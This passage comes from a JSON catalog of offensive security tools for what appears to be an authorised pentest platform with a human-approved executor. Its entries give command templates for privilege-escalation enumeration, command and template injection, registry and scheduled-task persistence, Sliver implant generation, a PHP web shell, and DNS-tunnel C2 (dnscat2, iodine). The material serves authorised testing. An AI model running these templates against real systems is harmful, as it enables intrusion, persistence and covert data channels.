          "label": "Search by product and version",
          "template": "searchsploit <query>",
          "note": "Fully offline. Keep the terms short — over-specific version strings miss."
        },
        {
          "label": "Show the path to an exploit",
          "template": "searchsploit -p <query>",
          "note": "Prints the full local path and copies it to the clipboard where available."
        },
        {
          "label": "Copy an exploit into the working directory",
          "template": "searchsploit -m <query>",
          "note": "Mirror, then READ the source before running it — many need editing, some are hostile."
        },
        {
          "label": "Match an nmap scan against the archive",
          "template": "searchsploit --nmap <file>",
          "note": "Takes the XML from nmap -oX / -oA and looks up every detected service."
        }
      ],
      "flags": [
        {"flag": "-p", "what": "show the exploit's path"},
        {"flag": "-m", "what": "mirror (copy) the exploit locally"},
        {"flag": "-x", "what": "examine the exploit"},
        {"flag": "--nmap", "what": "search from an nmap XML file"},
        {"flag": "-t", "what": "search titles only"}
      ]
    },
    {
      "name": "linpeas",
      "aliases": ["linpeas.sh"],
      "category": "privesc",
      "purpose": "Linux privilege-escalation enumeration script — runs hundreds of local checks and colour-codes what it finds by how likely it is to be exploitable.",
      "phases": ["privesc", "post-exploitation"],
      "techniques": ["local enumeration", "SUID/SGID discovery", "sudo misconfiguration", "cron and writable path analysis", "credential hunting"],
      "docs": "https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS",
      "templates": [
        {
          "label": "Full enumeration, output kept",
          "template": "./linpeas.sh -a | tee <output>",
          "note": "-a is the thorough pass. Red-on-yellow findings are the ones worth reading first."
        },
        {
          "label": "Targeted sections only",
          "template": "./linpeas.sh -o SysI,Devs,ProCronSrvcsTmrsSocks",
          "note": "Much quicker and far less noise when you already know what you are looking for."
        },
        {
          "label": "Quiet mode without colour",
          "template": "./linpeas.sh -q -N > <output>",
          "note": "Plain text for a report or for grepping offline."
        }
      ],
      "flags": [
        {"flag": "-a", "what": "all checks (slower, thorough)"},
        {"flag": "-o", "what": "run only the named sections"},
        {"flag": "-q", "what": "quiet"},
        {"flag": "-N", "what": "no colour"}
      ]
    },
    {
      "name": "winpeas",
      "platform": "windows",
      "aliases": ["winPEASx64", "winPEASx86", "winPEASany", "winPEAS.exe", "winpeas.bat"],
      "category": "privesc",
      "purpose": "The Windows counterpart to linpeas — enumerates services, registry, credentials, tokens and installed software, highlighting the misconfigurations that lead to SYSTEM.",
      "phases": ["privesc", "post-exploitation"],
      "techniques": ["local enumeration", "unquoted service path discovery", "token privilege analysis", "stored credential hunting", "AlwaysInstallElevated checks"],
      "docs": "https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS",
      "templates": [
        {
          "label": "Full enumeration to a log file",
          "template": "winPEASx64.exe log=<output>",
          "note": "Very loud on an EDR-monitored host — expect it to be detected."
        },
        {
          "label": "Targeted modules only",
          "template": "winPEASx64.exe systeminfo userinfo servicesinfo",
          "note": "Faster and much quieter than the full sweep."
        },
        {
          "label": "Search for stored credentials",
          "template": "winPEASx64.exe cmd searchfast filesinfo",
          "note": "Saved credentials in files and the registry are the most common quick win."
        }
      ],
      "flags": [
        {"flag": "log=", "what": "write output to a file"},
        {"flag": "quiet", "what": "suppress the banner"},
        {"flag": "notcolor", "what": "no ANSI colour"},
        {"flag": "searchfast", "what": "faster, shallower file search"}
      ]
    },
    {
      "name": "trufflehog",
      "category": "osint",
      "purpose": "Hunt for verified leaked secrets — API keys, tokens, credentials — across git history, filesystems and CI, with live verification to cut false positives.",
      "phases": [
        "osint",
        "recon"
      ],
      "techniques": [
        "secret scanning",
        "credential discovery",
        "git history analysis"
      ],
      "docs": "https://github.com/trufflesecurity/trufflehog",
      "templates": [
        {
          "label": "Scan a git repo (verified only)",
          "template": "trufflehog git <url> --only-verified",
          "note": "--only-verified drops unproven matches; start here to avoid noise."
        },
        {
          "label": "Scan a GitHub org",
          "template": "trufflehog github --org <org> --only-verified",
          "note": "Needs a token in env (GITHUB_TOKEN) for private/rate-limited reads."
        },
        {
          "label": "Scan a local filesystem path",
          "template": "trufflehog filesystem <output> --only-verified",
          "note": "Point at a cloned repo or a loot directory."
        }
      ],
      "flags": [
        {
          "flag": "--only-verified",
          "what": "keep only secrets confirmed live"
        },
        {
          "flag": "--json",
          "what": "machine-readable output"
        },
        {
          "flag": "--org",
          "what": "scan every repo in a GitHub org"
        }
      ]
    },
    {
      "name": "msftrecon",
      "category": "osint",
      "purpose": "Unauthenticated Microsoft 365 / Entra ID (Azure AD) tenant recon — tenant ID, federation, domains and enabled services — from just a domain name.",
      "phases": [
        "osint",
        "recon"
      ],
      "techniques": [
        "cloud tenant enumeration",
        "M365/Azure footprinting"
      ],
      "docs": "https://github.com/Arcanum-Sec/msftrecon",
      "templates": [
        {
          "label": "Enumerate a tenant from a domain",
          "template": "msftrecon -d <domain>",
          "note": "Needs internet egress; maps a domain to its Entra tenant and services."
        }
      ],
      "flags": [
        {
          "flag": "-d",
          "what": "target domain"
        },
        {
          "flag": "-o",
          "what": "output file"
        }
      ]
    },
    {
      "name": "github-subdomains",
      "category": "osint",
      "purpose": "Mine subdomains for a target from GitHub code search — a passive source that public DNS and CT logs miss.",
      "phases": [
        "recon",
        "osint"
      ],
      "techniques": [
        "passive subdomain enumeration",
        "OSINT"
      ],
      "docs": "https://github.com/gwen001/github-subdomains",
      "templates": [
        {
          "label": "Subdomains from GitHub code search",
          "template": "github-subdomains -d <domain> -t <token-file> -o <output>",
          "note": "Needs one or more GitHub tokens (-t file); results are best-effort by rate limit."
        }
      ],
      "flags": [
        {
          "flag": "-d",
          "what": "target domain"
        },
        {
          "flag": "-t",
          "what": "GitHub token file (one per line)"
        },
        {
          "flag": "-raw",
          "what": "plain host output"
        }
      ]
    },
    {
      "name": "gitlab-subdomains",
      "category": "osint",
      "purpose": "Mine subdomains for a target from GitLab code search — the GitLab counterpart to github-subdomains.",
      "phases": [
        "recon",
        "osint"
      ],
      "techniques": [
        "passive subdomain enumeration",
        "OSINT"
      ],
      "docs": "https://github.com/gwen001/gitlab-subdomains",
      "templates": [
        {
          "label": "Subdomains from GitLab code search",
          "template": "gitlab-subdomains -d <domain> -t <api-key>",
          "note": "Needs a GitLab token; complements the GitHub source."
        }
      ],
      "flags": [
        {
          "flag": "-d",
          "what": "target domain"
        },
        {
          "flag": "-t",
          "what": "GitLab API token"
        }
      ]
    },
    {
      "name": "dorks_hunter",
      "category": "osint",
      "purpose": "Run a curated set of Google dorks against a domain to surface exposed files, panels, logs and info leaks in one pass.",
      "phases": [
        "osint"
      ],
      "techniques": [
        "google dorking",
        "OSINT",
        "exposure discovery"
      ],
      "docs": "https://github.com/six2dez/dorks_hunter",
      "templates": [
        {
          "label": "Dork a domain",
          "template": "dorks_hunter -d <domain> -o <output>",
          "note": "Needs internet egress; results depend on search availability/rate limits."
        }
      ],
      "flags": [
        {
          "flag": "-d",
          "what": "target domain"
        },
        {
          "flag": "-o",
          "what": "output file"
        }
      ]
    },
    {
      "name": "gitdorks_go",
      "category": "osint",
      "purpose": "Search GitHub with a dork list for secrets and sensitive references tied to a target — automated GitHub dorking.",
      "phases": [
        "osint"
      ],
      "techniques": [
        "github dorking",
        "secret discovery",
        "OSINT"
      ],
      "docs": "https://github.com/damit5/gitdorks_go",
      "templates": [
        {
          "label": "GitHub dork a target",
          "template": "gitdorks_go -target <domain> -tf <token-file> -gd <dorks-file> -nws 20",
          "note": "Needs GitHub token(s); -gd points at a dork list, -nws caps concurrency."
        }
      ],
      "flags": [
        {
          "flag": "-target",
          "what": "target org/domain keyword"
        },
        {
          "flag": "-tf",
          "what": "GitHub token file"
        },
        {
          "flag": "-gd",
          "what": "dork list file"
        }
      ]
    },
    {
      "name": "gotator",
      "category": "recon",
      "purpose": "Generate DNS permutation candidates from known subdomains + a words list — the rule-based half of permutation enumeration.",
      "phases": [
        "recon"
      ],
      "techniques": [
        "subdomain permutation",
        "candidate generation"
      ],
      "docs": "https://github.com/Josue87/gotator",
      "templates": [
        {
          "label": "Permute known subdomains",
          "template": "gotator -sub <subs-file> -perm <wordlist> -depth 1 -numbers 3 -mindup -adv -md > <output>",
          "note": "Feed the output into puredns to resolve; candidates are unresolved by design."
        }
      ],
      "flags": [
        {
          "flag": "-depth",
          "what": "permutation recursion depth"
        },
        {
          "flag": "-numbers",
          "what": "append/insert up to N numbers"
        },
        {
          "flag": "-adv",
          "what": "advanced permutations"
        },
        {
          "flag": "-md",
          "what": "use the words also as data (mix-in)"
        }
      ]
    },
    {
      "name": "regulator",
      "category": "recon",
      "purpose": "Derive high-yield permutation rules from the subdomains you already found (learns the target's naming pattern) instead of a generic word list.",
      "phases": [
        "recon"
      ],
      "techniques": [
        "subdomain permutation",
        "pattern learning"
      ],
      "docs": "https://github.com/cramppet/regulator",
      "templates": [
        {
          "label": "Learn rules + emit candidates",
          "template": "regulator -t <domain> -f <subs-file> -o <output>",
          "note": "Output is a candidate list — resolve it with puredns."
        }
      ],
      "flags": [
        {
          "flag": "-t",
          "what": "target apex domain"
        },
        {
          "flag": "-f",
          "what": "observed subdomains file"
        },
        {
          "flag": "-o",
          "what": "candidate output file"
        }
      ]
    },
    {
      "name": "subwiz",
      "category": "recon",
      "purpose": "ML-based subdomain prediction: from the subdomains already found, a trained model proposes likely new ones — smarter than brute force, cheaper than a huge wordlist.",
      "phases": [
        "recon"
      ],
      "techniques": [
        "subdomain prediction",
        "ML permutation"
      ],
      "docs": "https://github.com/hadriansecurity/subwiz",
      "templates": [
        {
          "label": "Predict new subdomains",
          "template": "subwiz -i <subs-file> -o <output>",
          "note": "Fetches its model at runtime, so it runs in the engagement/:kali sandboxes (which have egress) but NOT the airgapped lab; gotator/regulator cover permutations offline."
        }
      ],
      "flags": [
        {
          "flag": "-i",
          "what": "input observed subdomains"
        },
        {
          "flag": "-o",
          "what": "predicted output"
        }
      ]
    },
    {
      "name": "puredns",
      "category": "recon",
      "purpose": "Resolve massive host lists fast and filter DNS wildcards accurately — the resolution backbone that turns permutation/brute candidates into real subdomains.",
      "phases": [
        "recon"
      ],
      "techniques": [
        "DNS resolution",
        "wildcard filtering",
        "DNS bruteforce"
      ],
      "docs": "https://github.com/d3mondev/puredns",
      "templates": [
        {
          "label": "Resolve a candidate list",
          "template": "puredns resolve <subs-file> -r <resolvers> --write <output>",
          "note": "Wildcard-filters as it resolves; pair with gotator/regulator output."
        },
        {
          "label": "Bruteforce subdomains",
          "template": "puredns bruteforce <wordlist> <domain> -r <resolvers> --write <output>",
          "note": "Uses massdns under the hood; resolver validation needs egress."
        }
      ],
      "flags": [
        {
          "flag": "-r",
          "what": "trusted resolvers file"
        },
        {
          "flag": "--write",
          "what": "write resolved hosts"
        },
        {
          "flag": "--wildcard-tests",
          "what": "wildcard detection sensitivity"
        }
      ]
    },
    {
      "name": "massdns",
      "category": "recon",
      "purpose": "Very high-throughput stub DNS resolver — the engine puredns drives, usable directly for bulk A/CNAME resolution.",
      "phases": [
        "recon"
      ],
      "techniques": [
        "mass DNS resolution"
      ],
      "docs": "https://github.com/blechschmidt/massdns",
      "templates": [
        {
          "label": "Bulk-resolve a host list",
          "template": "massdns -r <resolvers> -t A -o S -w <output> <subs-file>",
          "note": "-o S is simple text output; feed a wildcard-aware step afterwards."
        }
      ],
      "flags": [
        {
          "flag": "-r",
          "what": "resolvers file"
        },
        {
          "flag": "-t",
          "what": "record type"
        },
        {
          "flag": "-o",
          "what": "output format (S=simple)"
        }
      ]
    },
    {
      "name": "dnsvalidator",
      "category": "recon",
      "purpose": "Build a list of DNS resolvers that actually return correct answers — the trusted-resolver input puredns/massdns depend on for clean results.",
      "phases": [
        "recon"
      ],
      "techniques": [
        "resolver generation",
        "DNS hygiene"
      ],
      "docs": "https://github.com/vortexau/dnsvalidator",
      "templates": [
        {
          "label": "Generate a validated resolver list",
          "template": "dnsvalidator -tL https://public-dns.info/nameservers.txt -threads 100 -o <output>",
          "note": "Needs egress to validate; the baked /usr/share/resolvers.txt is the offline fallback in the lab."
        }
      ],
      "flags": [
        {
          "flag": "-tL",
          "what": "source resolver list URL"
        },
        {
          "flag": "-threads",
          "what": "validation concurrency"
        },
        {
          "flag": "-o",
          "what": "validated output file"
        }
      ]
    },
    {
      "name": "asnmap",
      "category": "recon",
      "purpose": "Map an organisation or domain to its ASNs and the CIDR ranges they own — the first move for expanding scope on a wide target.",
      "phases": [
        "recon"
      ],
      "techniques": [
        "ASN enumeration",
        "scope expansion",
        "CIDR discovery"
      ],
      "docs": "https://github.com/projectdiscovery/asnmap",
      "templates": [
        {
          "label": "CIDRs owned by a domain",
          "template": "asnmap -d <domain> -silent",
          "note": "Only act on ranges inside the authorised scope — this widens what you can see, not what you may touch."
        },
        {
          "label": "CIDRs for an ASN",
          "template": "asnmap -a <asn> -silent",
          "note": "PDCP_API_KEY improves coverage but is optional."
        }
      ],
      "flags": [
        {
          "flag": "-d",
          "what": "resolve a domain to ASNs/CIDRs"
        },
        {
          "flag": "-a",
          "what": "look up an ASN"
        },
        {
          "flag": "-silent",
          "what": "results only"
        }
      ]
    },
    {
      "name": "mapcidr",
      "category": "recon",
      "purpose": "Expand, aggregate and slice CIDR ranges into host lists (and back) — the plumbing between ASN discovery and host-level scanning.",
      "phases": [
        "recon"
      ],
      "techniques": [
        "CIDR expansion",
        "IP list manipulation"
      ],
      "docs": "https://github.com/projectdiscovery/mapcidr",
      "templates": [
        {
          "label": "Expand a CIDR to hosts",
          "template": "mapcidr -cidr <cidr> -silent",
          "note": "Pipe into a resolver/scanner; keep ranges scope-checked."
        }
      ],
      "flags": [
        {
          "flag": "-cidr",
          "what": "input range"
        },
        {
          "flag": "-aggregate",
          "what": "collapse to smallest set"
        },
        {
          "flag": "-silent",
          "what": "results only"
        }
      ]
    },
    {
      "name": "tlsx",
      "category": "recon",
      "purpose": "Grab TLS certificate data (SANs, CN, issuer) at scale — a fast way to pull extra hostnames straight off the certificates a target serves.",
      "phases": [
        "recon"
      ],
      "techniques": [
        "TLS certificate recon",
        "subdomain discovery"
      ],
      "docs": "https://github.com/projectdiscovery/tlsx",
      "templates": [
        {
          "label": "Pull SAN/CN names from hosts",
          "template": "tlsx -l <subs-file> -san -cn -silent",
          "note": "SAN entries often reveal sibling hostnames; feed them back into resolution."
        }
      ],
      "flags": [
        {
          "flag": "-san",
          "what": "subject alternative names"
        },
        {
          "flag": "-cn",
          "what": "common name"
        },
        {
          "flag": "-silent",
          "what": "results only"
        }
      ]
    },
    {
      "name": "csprecon",
      "category": "recon",
      "purpose": "Extract hostnames from a target's Content-Security-Policy headers — a passive subdomain source hiding in plain sight in HTTP responses.",
      "phases": [
        "recon"
      ],
      "techniques": [
        "CSP analysis",
        "subdomain discovery"
      ],
      "docs": "https://github.com/edoardottt/csprecon",
      "templates": [
        {
          "label": "Hosts from CSP headers",
          "template": "csprecon -u <url> -d <domain>",
          "note": "-d keeps results scoped to the target apex."
        }
      ],
      "flags": [
        {
          "flag": "-u",
          "what": "target URL"
        },
        {
          "flag": "-d",
          "what": "restrict to this domain"
        }
      ]
    },
    {
      "name": "gf",
      "category": "web",
      "purpose": "Grep a URL list through curated pattern packs to triage vuln candidates (XSS/SSRF/SQLi/redirect/…) — turns a raw URL dump into a prioritised worklist.",
      "phases": [
        "web"
      ],
      "techniques": [
        "URL triage",
        "pattern matching",
        "attack-surface prioritisation"
      ],
      "docs": "https://github.com/tomnomnom/gf",
      "templates": [
        {
          "label": "Pull XSS candidate URLs",
          "template": "cat <urls-file> | gf xss",
          "note": "Relies on the gf-patterns baked into the image at ~/.gf; the pattern name selects the bug class."
        },
        {
          "label": "Pull candidates for a bug class",
          "template": "cat <urls-file> | gf <pattern>",
          "note": "e.g. ssrf, sqli, redirect, lfi, rce — feed the hits into qsreplace + a targeted scanner."
        }
      ],
      "flags": [
        {
          "flag": "-list",
          "what": "list available patterns"
        }
      ]
    },
    {
      "name": "qsreplace",
      "category": "web",
      "purpose": "Rewrite every query-string value in a URL list with a chosen value/payload — the glue that turns harvested URLs into a fuzzable payload set.",
      "phases": [
        "web"
      ],
      "techniques": [
        "parameter fuzzing prep",
        "payload injection"
      ],
      "docs": "https://github.com/tomnomnom/qsreplace",
      "templates": [
        {
          "label": "Inject a payload into all params",
          "template": "cat <urls-file> | qsreplace '<payload>'",
          "note": "Pipe the result into a scanner (dalfox, nuclei -dast) — qsreplace itself only rewrites text."
        }
      ],
      "flags": [
        {
          "flag": "-a",
          "what": "append instead of replace"
        }
      ]
    },
    {
      "name": "unfurl",
      "category": "web",
      "purpose": "Break URLs into their parts (domains, paths, keys, params) for sorting and dedup — a small but constant step in any URL-processing pipeline.",
      "phases": [
        "web",
        "recon"
      ],
      "techniques": [
        "URL parsing",
        "attack-surface shaping"
      ],
      "docs": "https://github.com/tomnomnom/unfurl",
      "templates": [
        {
          "label": "Extract unique param keys",
          "template": "cat <urls-file> | unfurl keys",
          "note": "Also: domains, paths, apexes, format — cheap building blocks."
        }
      ],
      "flags": [
        {
          "flag": "-u",
          "what": "unique output"
        }
      ]
    },
    {
      "name": "jsluice",
      "category": "web",
      "purpose": "Parse JavaScript to extract endpoints, URLs and secrets that crawling alone misses — reads the JS instead of just listing it.",
      "phases": [
        "web"
      ],
      "techniques": [
        "JavaScript analysis",
        "endpoint discovery",
        "secret discovery"
      ],
      "docs": "https://github.com/BishopFox/jsluice",
      "templates": [
        {
          "label": "Extract endpoints from JS",
          "template": "cat <js-file> | jsluice urls",
          "note": "Finds fetch/XHR/route strings the DOM never renders."
        },
        {
          "label": "Extract secrets from JS",
          "template": "jsluice secrets <js-file>",
          "note": "Flags API keys/tokens embedded in bundles."
        }
      ],
      "flags": [
        {
          "flag": "urls",
          "what": "endpoint/URL extraction mode"
        },
        {
          "flag": "secrets",
          "what": "secret extraction mode"
        }
      ]
    },
    {
      "name": "subjs",
      "category": "web",
      "purpose": "Discover the JavaScript files a set of pages loads — the fetch step that feeds jsluice/getjs.",
      "phases": [
        "web",
        "recon"
      ],
      "techniques": [
        "JavaScript discovery"
      ],
      "docs": "https://github.com/lc/subjs",
      "templates": [
        {
          "label": "List JS URLs from pages",
          "template": "cat <urls-file> | subjs",
          "note": "Pipe the JS URLs into getjs (fetch) then jsluice (parse)."
        }
      ],
      "flags": [
        {
          "flag": "-c",
          "what": "concurrency"
        }
      ]
    },
    {
      "name": "getjs",
      "category": "web",
      "purpose": "Fetch JavaScript files (including from a URL list) for offline analysis — the retrieval half of JS mining.",
      "phases": [
        "web"
      ],
      "techniques": [
        "JavaScript discovery",
        "content retrieval"
      ],
      "docs": "https://github.com/003random/getJS",
      "templates": [
        {
          "label": "Fetch JS from a URL list",
          "template": "getjs --input <urls-file> --complete",
          "note": "--complete resolves relative script src to absolute URLs."
        }
      ],
      "flags": [
        {
          "flag": "--input",
          "what": "input URL list"
        },
        {
          "flag": "--complete",
          "what": "resolve relative to absolute URLs"
        }
      ]
    },
    {
      "name": "commix",
      "category": "web",
      "purpose": "Detect and exploit OS command-injection in web parameters automatically.",
      "phases": [
        "exploitation",
        "web"
      ],
      "techniques": [
        "command injection"
      ],
      "docs": "https://github.com/commixproject/commix",
      "templates": [
        {
          "label": "Test a parameter",
          "template": "commix -u \"<url>?<param>=1\" --batch",
          "note": "This exploits, not just tests — it correctly trips the executor's danger confirm."
        }
      ],
      "flags": [
        {
          "flag": "--batch",
          "what": "non-interactive defaults"
        },
        {
          "flag": "--level",
          "what": "test depth 1-3"
        }
      ]
    },
    {
      "name": "SSTImap",
      "category": "web",
      "purpose": "Detect and exploit server-side template injection across many engines, with sandbox-escape payloads.",
      "phases": [
        "exploitation",
        "web"
      ],
      "techniques": [
        "server-side template injection"
      ],
      "docs": "https://github.com/vladko312/SSTImap",
      "templates": [
        {
          "label": "Test a parameter for SSTI",
          "template": "SSTImap -u \"<url>?<param>=*\"",
          "note": "The * marks the injection point; escalates to RCE where the engine allows — danger-confirmed."
        }
      ],
      "flags": [
        {
          "flag": "-u",
          "what": "target URL"
        },
        {
          "flag": "--os-cmd",
          "what": "run an OS command if exploitable"
        }
      ]
    },
    {
      "name": "nomore403",
      "category": "web",
      "purpose": "Attempt a battery of 403/401 access-control bypasses (header, path, method and case tricks) against a forbidden URL.",
      "phases": [
        "web"
      ],
      "techniques": [
        "403 bypass",
        "access-control bypass"
      ],
      "docs": "https://github.com/devploit/nomore403",
      "templates": [
        {
          "label": "Bypass a forbidden path",
          "template": "nomore403 -u <url>",
          "note": "Complements the bypass-403 methodology; treat successes as leads to verify by hand."
        }
      ],
      "flags": [
        {
          "flag": "-u",
          "what": "target URL"
        },
        {
          "flag": "-H",
          "what": "add a custom header"
        }
      ]
    },
    {
      "name": "crlfuzz",
      "category": "web",
      "purpose": "Fuzz for CRLF injection (header/response splitting) across a URL list at speed.",
      "phases": [
        "web"
      ],
      "techniques": [
        "CRLF injection",
        "header injection"
      ],
      "docs": "https://github.com/dwisiswant0/crlfuzz",
      "templates": [
        {
          "label": "Scan a single URL",
          "template": "crlfuzz -u <url>",
          "note": "Pairs with the cmd-injection (commix) and SSTI (SSTImap) tools to round out the injection set."
        },
        {
          "label": "Scan a URL list",
          "template": "cat <urls-file> | crlfuzz",
          "note": "Feed gf/qsreplace output straight in."
        }
      ],
      "flags": [
        {
          "flag": "-u",
          "what": "target URL"
        },
        {
          "flag": "-c",
          "what": "concurrency"
        }
      ]
    },
    {
      "name": "s3scanner",
      "category": "cloud",
      "purpose": "Enumerate open/misconfigured object-storage buckets (S3 and compatible) and dump their permissions — external cloud recon, distinct from the posture scanners.",
      "phases": [
        "recon",
        "osint"
      ],
      "techniques": [
        "cloud bucket enumeration",
        "storage misconfiguration"
      ],
      "docs": "https://github.com/sa7mon/S3Scanner",
      "templates": [
        {
          "label": "Scan a named bucket",
          "template": "s3scanner scan --bucket <bucket>",
          "note": "Reports open/closed + which permissions are world-readable/writable."
        },
        {
          "label": "Scan a bucket list",
          "template": "s3scanner scan --bucket-file <subs-file>",
          "note": "Derive candidate names from the target keyword first."
        }
      ],
      "flags": [
        {
          "flag": "--bucket",
          "what": "single bucket name"
        },
        {
          "flag": "--bucket-file",
          "what": "file of bucket names"
        }
      ]
    },
    {
      "name": "cloud_enum",
      "category": "cloud",
      "purpose": "Enumerate public cloud assets across AWS, Azure and GCP (buckets, blobs, functions, apps) from a base keyword — multi-cloud external asset discovery.",
      "phases": [
        "recon",
        "osint"
      ],
      "techniques": [
        "cloud asset enumeration",
        "multi-cloud recon"
      ],
      "docs": "https://github.com/initstring/cloud_enum",
      "templates": [
        {
          "label": "Enumerate assets for a keyword",
          "template": "cloud_enum -k <keyword>",
          "note": "Needs egress; repeat -k for name variants (company, product, abbreviations)."
        }
      ],
      "flags": [
        {
          "flag": "-k",
          "what": "keyword to mutate into asset names"
        },
        {
          "flag": "-l",
          "what": "log output to file"
        }
      ]
    },
    {
      "name": "SharPersist",
      "platform": "windows",
      "aliases": [
        "SharPersist.exe"
      ],
      "category": "persistence",
      "purpose": "Windows persistence toolkit (Mandiant) — add or remove one persistence mechanism at a time from inside a session: scheduled tasks, registry autorun, startup folder and services, with add/remove and list modes so an operator can also clean up.",
      "phases": [
        "post-exploitation"
      ],
      "techniques": [
        "scheduled task",
        "registry autorun",
        "startup folder",
        "service",
        "persistence"
      ],
      "docs": "https://github.com/mandiant/SharPersist",
      "templates": [
        {
          "label": "Scheduled-task persistence (logon)",
          "template": "SharPersist.exe -t schtask -c \"<payload>\" -n \"<name>\" -m add",
          "note": "Adds a logon-triggered task. `-m remove` reverses it; `-m check`/`-m list` enumerate what is present."
        },
        {
          "label": "Registry Run-key persistence",
          "template": "SharPersist.exe -t reg -c \"<payload>\" -a \"<name>\" -k \"hkcurun\" -m add",
          "note": "Writes a CurrentVersion\\Run value under HKCU (or `hklmrun` with admin)."
        },
        {
          "label": "Startup-folder persistence",
          "template": "SharPersist.exe -t startupfolder -c \"<payload>\" -f \"<name>\" -m add",
          "note": "Drops a shortcut into the user's Startup folder."
        }
      ],
      "flags": [
        {
          "flag": "-t",
          "what": "technique (schtask, reg, startupfolder, service, …)"
        },
        {
          "flag": "-m",
          "what": "mode: add / remove / check / list"
        },
        {
          "flag": "-c",
          "what": "command / payload to run"
        },
        {
          "flag": "-k",
          "what": "registry key location (hkcurun / hklmrun)"
        }
      ]
    },
    {
      "name": "Sliver",
      "aliases": ["sliver-server", "sliver-client"],
      "category": "c2",
      "purpose": "Cross-platform adversary-emulation C2 framework (Bishop Fox): mTLS, HTTP(S), DNS and WireGuard listeners with per-OS implants, plus post-exploitation and persistence modules. Human-driven in HackPit — starting a listener and every implant action is its own approved step through the gated executor. Its sandbox-image install and the cockpit Sliver panel land in later tasks of this build; until they do, reconcile shows it not-present and the planner will not propose it.",
      "phases": [
        "command-and-control",
        "post-exploitation"
      ],
      "techniques": [
        "C2",
        "adversary emulation",
        "implant generation",
        "beaconing",
        "DNS C2",
        "implant persistence"
      ],
      "docs": "https://github.com/BishopFox/sliver",
      "templates": [
        {
          "label": "Start an mTLS listener (Sliver console)",
          "template": "mtls --lport <listener-port>",
          "note": "Operator-side listener, on your own host. Starting and stopping it is a human-driven, gated action — nothing in the catalog starts a listener."
        },
        {
          "label": "Generate an mTLS implant (Sliver console)",
          "template": "generate --mtls <listener> --save <output>",
          "note": "Run inside the Sliver console. Produces an artifact on disk; delivering or running it is a separate, separately-approved step."
        },
        {
          "label": "Generate a DNS implant (Sliver console)",
          "template": "generate --dns <tunnel-zone> --save <output>",
          "note": "Beacons over a DNS zone YOU control and have delegated — never the target's. Much louder in DNS telemetry than mTLS; see the detection footprint for what a defender sees."
        }
      ],
      "flags": []
    },
    {
      "name": "Empire",
      "aliases": ["powershell-empire"],
      "category": "persistence",
      "purpose": "PowerShell/Python post-exploitation framework with a catalogue of persistence modules. Reference-only in HackPit: NOT installed — catalogued so the planner can name it, but no install or C2 wiring is provided, so reconcile shows it not-present and the planner will not propose it.",
      "phases": [
        "command-and-control",
        "post-exploitation"
      ],
      "techniques": [
        "C2",
        "PowerShell/Python agents",
        "persistence modules"
      ],
      "docs": "https://github.com/BC-SECURITY/Empire",
      "templates": [
        {
          "label": "Select a persistence module (Empire client)",
          "template": "usemodule persistence/<technique>",
          "note": "Run inside the Empire client. Reference-only — Empire is not installed; run it from your own host."
        }
      ],
      "flags": []
    },
    {
      "name": "weevely",
      "aliases": [
        "weevely3"
      ],
      "category": "persistence",
      "purpose": "Obfuscated PHP web-shell generator and client (T1505.003) — generates a stealthy PHP backdoor and drives it over an encrypted channel. Reference-only in HackPit: NOT installed.",
      "phases": [
        "post-exploitation"
      ],
      "techniques": [
        "web shell",
        "T1505.003",
        "persistence"
      ],
      "docs": "https://github.com/epinna/weevely3",
      "templates": [
        {
          "label": "Generate an obfuscated PHP web shell",
          "template": "weevely generate <password> <output>",
          "note": "Produces the backdoor file you then drop into the web root."
        },
        {
          "label": "Connect to a planted web shell",
          "template": "weevely <url> <password>",
          "note": "Opens the managed session against an already-deployed shell."
        }
      ],
      "flags": []
    },
    {
      "name": "dnscat2",
      "aliases": [
        "dnscat2-server",
        "dnscat2-client"
      ],
      "category": "evasion",
      "purpose": "Encrypted command-and-control tunnelled entirely over DNS (T1071.004). The client talks only to the host's configured resolver, so it reaches the operator's authoritative server through the target's own DNS infrastructure without opening a direct outbound socket — which is what makes it the test of whether egress filtering and DNS analytics catch a covert channel. Its sandbox-image install lands in a later task of this build.",
      "phases": [
        "command-and-control",
        "post-exploitation"
      ],
      "techniques": [
        "DNS tunneling",
        "covert channel",
        "C2",
        "T1071.004"
      ],
      "docs": "https://github.com/iagox86/dnscat2",
      "templates": [
        {
          "label": "Start the server (operator side)",
          "template": "dnscat2-server <tunnel-zone>",
          "note": "Runs on the authoritative name server for a zone YOU control and have had delegated — never the target's zone. Listener lifecycle is human-driven through the gated executor."
        },
        {
          "label": "Connect a client from the compromised host",
          "template": "dnscat2-client <tunnel-zone>",
          "note": "Runs on a host you already have execution on, as its own approved step. Add `--dns server=<listener>` only to test direct-to-server mode instead of recursion through the target's resolver."
        }
      ],
      "flags": [
        {
          "flag": "--dns",
          "what": "resolver/transport settings, e.g. server=, port=, domain="
        },
        {
          "flag": "--secret",
          "what": "pre-shared key authenticating the encrypted session"
        },
        {
          "flag": "--no-cache",
          "what": "disable the server-side response cache"
        }
      ]
    },
    {
      "name": "iodine",
      "aliases": [
        "iodined"
      ],
      "category": "evasion",
      "purpose": "IP-over-DNS tunnel (T1572): brings up a point-to-point interface whose packets ride inside DNS queries, so ordinary tooling can be routed through a network that permits nothing but DNS. Slower and far louder in DNS telemetry than a purpose-built C2 — catalogued to prove out egress controls, not to stay quiet. Its sandbox-image install lands in a later task of this build.",
      "phases": [
        "command-and-control",
        "post-exploitation"
      ],
      "techniques": [
        "DNS tunneling",
        "IP over DNS",
        "protocol tunneling",
        "T1572"
      ],
      "docs": "https://github.com/yarrick/iodine",
      "templates": [
        {
          "label": "Start the server (operator side)",
          "template": "iodined -f -c -P <password> <tunnel-net> <tunnel-zone>",
          "note": "Runs on the name server for a delegated zone YOU control. <tunnel-net> is the tunnel interface's own address/netmask and is unrelated to any engagement range."
        },
        {
          "label": "Connect a client from the compromised host",
          "template": "iodine -f -P <password> <tunnel-zone>",
          "note": "Runs on the host you already have execution on. `-r` forces DNS-only mode when the faster raw-UDP path would succeed and it is the DNS path you want tested."
        }
      ],
      "flags": [
        {
          "flag": "-f",
          "what": "stay in the foreground"
        },
        {
          "flag": "-P",
          "what": "pre-shared password for the tunnel"
        },
        {
          "flag": "-c",
          "what": "server: skip the client-IP check"
        },
        {
          "flag": "-r",
          "what": "client: skip the raw-UDP probe, force DNS-only"
        }
      ]
    },
    {
      "name": "donut",
      "category": "evasion",
